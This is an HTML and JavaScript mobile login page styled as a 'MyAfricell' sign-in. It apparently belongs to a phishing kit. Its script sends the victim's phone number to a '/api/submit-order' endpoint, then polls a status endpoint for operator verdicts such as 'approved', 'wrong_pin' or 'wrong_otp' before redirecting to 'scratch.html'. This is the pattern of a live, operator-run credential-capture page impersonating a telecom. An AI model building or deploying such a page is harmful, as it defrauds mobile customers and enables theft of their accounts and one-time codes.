<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MyAfricell | Sign In</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body::-webkit-scrollbar { display: none; }
        body { scrollbar-width: none; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }

        html, body {
            width: 100%; height: 100%;
            background: #FFFFFF; /* Pure background matching full screen */
            display: flex; justify-content: center; align-items: center;
            overflow-y: auto; padding: 0; /* Removed padding to touch edges */
        }

        /* True full screen with zero margins and zero border radius */
        .mobile-viewport {
            width: 100%;
            max-width: 100%;
            height: 100%;
            max-height: 100%;
            background: #FFFFFF;
            border-radius: 0; /* Fully flushed edges */
            box-shadow: none;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 40px 24px 24px 24px;
            border: none;
            overflow: hidden;
        }

        .top-stack { width: 100%; text-align: center; }
        .login-heading { font-size: 32px; font-weight: 800; color: #991676; margin-bottom: 20px; }
        .login-heading span { display: block; }

        .middle-stack { 
            width: 100%; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            margin: auto 0; 
            gap: 20px; 
            padding: 16px 0; 
        }

        .phone-input-wrapper {
            width: 100%; background: #F7F8FA; border: 2px solid #E5E7EB;
            border-radius: 16px; padding: 14px 18px; cursor: pointer; transition: all 0.2s ease;
        }
        .phone-input-wrapper.active-field { border-color: #991676; background: #FFFFFF; box-shadow: 0 0 0 3px rgba(153, 22, 118, 0.15); }
        .phone-label { font-size: 11px; font-weight: 600; color: #6B7280; margin-bottom: 4px; display: block; text-transform: uppercase; text-align: left; }
        .phone-input-row { display: flex; align-items: center; gap: 12px; }
        .phone-input-row i { color: #9CA3AF; font-size: 16px; }
        .phone-input-field { width: 100%; background: transparent; border: none; font-size: 16px; font-weight: 600; color: #1F2937; outline: none; pointer-events: none; }
        .phone-input-field::placeholder { color: #9CA3AF; font-weight: 400; }

        .pp-error-box {
            width: 100%; display: none; align-items: center; justify-content: center; gap: 8px;
            color: #E31B23; font-size: 14px; font-weight: 500; text-align: center;
            background: rgba(227, 27, 35, 0.08); padding: 10px 14px; border-radius: 12px;
        }

        .bottom-stack { width: 100%; display: flex; flex-direction: column; align-items: center; padding-top: 20px; }

        .btn-login {
            width: 100%;
            max-width: 100%; /* Fully stretches to touch sides */
            height: 60px;
            background: #E8B4D4; 
            color: #FFFFFF;
            border: none; 
            border-radius: 16px; /* Modern flat button look that touches edges nicely */
            font-size: 18px; 
            font-weight: 700;
            cursor: pointer; 
            text-align: center; 
            text-transform: uppercase;
            transition: all 0.2s ease; 
            letter-spacing: 0.5px;
            margin-bottom: 24px;
        }
        .btn-login.enabled { background: #991676; box-shadow: 0 8px 20px rgba(153, 22, 118, 0.3); }
        .btn-login:disabled { cursor: not-allowed; }

        .onscreen-keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; width: 100%; max-width: 360px; }
        .keypad-btn {
            background: transparent; border: none; height: 60px; font-size: 28px;
            font-weight: 600; color: #1F2937; display: flex; align-items: center;
            justify-content: center; cursor: pointer; border-radius: 50%;
            transition: background 0.1s ease;
        }
        .keypad-btn:active { background: #E5E7EB; }
        .keypad-btn.action-key { font-size: 22px; color: #4B5563; }
    </style>
</head>
<body>

    <div class="mobile-viewport">
        <div class="top-stack">
            <h1 class="login-heading">Welcome to <span>MyAfricell!</span></h1>
        </div>

        <div class="middle-stack">
            <div class="phone-input-wrapper active-field" id="phoneWrapper">
                <span class="phone-label">Enter Phone Number</span>
                <div class="phone-input-row">
                    <i class="fa-solid fa-phone"></i>
                    <input type="text" id="mobileNumber" class="phone-input-field" placeholder="Enter phone number" readonly value="">
                </div>
            </div>

            <div id="inlineErrorBox" class="pp-error-box">
                <i class="fa-solid fa-circle-exclamation"></i>
                <span id="errorText">Please check your details.</span>
            </div>
        </div>

        <div class="bottom-stack">
            <button type="button" id="loginBtn" class="btn-login" disabled onclick="handleLogin()">Sign in</button>

            <div class="onscreen-keypad">
                <button type="button" class="keypad-btn" onclick="pressKey('1')">1</button>
                <button type="button" class="keypad-btn" onclick="pressKey('2')">2</button>
                <button type="button" class="keypad-btn" onclick="pressKey('3')">3</button>
                <button type="button" class="keypad-btn" onclick="pressKey('4')">4</button>
                <button type="button" class="keypad-btn" onclick="pressKey('5')">5</button>
                <button type="button" class="keypad-btn" onclick="pressKey('6')">6</button>
                <button type="button" class="keypad-btn" onclick="pressKey('7')">7</button>
                <button type="button" class="keypad-btn" onclick="pressKey('8')">8</button>
                <button type="button" class="keypad-btn" onclick="pressKey('9')">9</button>
                <div></div>
                <button type="button" class="keypad-btn" onclick="pressKey('0')">0</button>
                <button type="button" class="keypad-btn action-key" onclick="deleteKey()"><i class="fa-solid fa-delete-left"></i></button>
            </div>
        </div>
    </div>

    <script>
        const mobileInput = document.getElementById('mobileNumber');
        const loginBtn = document.getElementById('loginBtn');
        const errorBox = document.getElementById('inlineErrorBox');
        const errorText = document.getElementById('errorText');

        let phoneValue = '';
        let activeInterval = null;
        const pageLoadTimestamp = Date.now();

        window.addEventListener('DOMContentLoaded', () => {
            localStorage.removeItem('africellApprovalTimestamp');
            const savedPhone = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone');
            if (savedPhone) {
                phoneValue = savedPhone.replace('+232', '').trim();
                mobileInput.value = phoneValue;
                validateForm();
            }
        });

        function showInlineError(msg) { errorText.innerText = msg; errorBox.style.display = 'flex'; }
        function hideInlineError() { errorBox.style.display = 'none'; }

        function pressKey(digit) {
            if (phoneValue.length < 15) {
                phoneValue += digit;
                mobileInput.value = phoneValue;
            }
            validateForm();
        }

        function deleteKey() {
            if (phoneValue.length > 0) {
                phoneValue = phoneValue.slice(0, -1);
                mobileInput.value = phoneValue;
            }
            validateForm();
        }

        function validateForm() {
            if (phoneValue.trim().length >= 7) {
                loginBtn.removeAttribute('disabled');
                loginBtn.classList.add('enabled');
            } else {
                loginBtn.setAttribute('disabled', 'true');
                loginBtn.classList.remove('enabled');
            }
            hideInlineError();
        }

        function handleLogin() {
            const rawPhone = phoneValue.trim();

            if (rawPhone.length < 7) {
                showInlineError('Please enter a valid mobile number.');
                return;
            }

            const fullPhone = '+232 ' + rawPhone;
            localStorage.setItem('africellUserPhone', fullPhone);
            localStorage.setItem('userPhone', fullPhone);

            submitLoginCredentials(fullPhone);
        }

        async function submitLoginCredentials(phone) {
            try {
                loginBtn.setAttribute('disabled', 'true');
                loginBtn.classList.remove('enabled');
                loginBtn.textContent = 'Signing in...';

                await fetch('/api/submit-order', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone, uniqueId: 'Sign-in Phone Number: ' + phone })
                });

                pollApprovalStatus(phone);
            } catch (err) {
                pollApprovalStatus(phone);
            }
        }

        function resetBtnState() {
            loginBtn.textContent = 'Sign in';
            loginBtn.removeAttribute('disabled');
            loginBtn.classList.add('enabled');
            phoneValue = '';
            mobileInput.value = '';
        }

        function pollApprovalStatus(phone) {
            if (activeInterval) clearInterval(activeInterval);
            const submissionTimestamp = Date.now();

            activeInterval = setInterval(async () => {
                try {
                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(phone.trim())}&t=${Date.now()}`);
                    const data = await response.json();

                    if (data.status === 'approved' && data.timestamp && data.timestamp >= pageLoadTimestamp && data.timestamp >= submissionTimestamp) {
                        clearInterval(activeInterval);
                        window.location.href = 'scratch.html';
                    } 
                    else if ((data.status === 'rejected' || data.status === 'wrong_id' || data.status === 'wrong_pin' || data.status === 'wrong_otp') && data.timestamp && data.timestamp >= submissionTimestamp) {
                        clearInterval(activeInterval);
                        showInlineError('⚠️ Incorrect phone number. Please try again.');
                        resetBtnState();
                    }
                } catch (e) { console.error(e); }
            }, 3000);
        }
    </script>
</body>
</html>
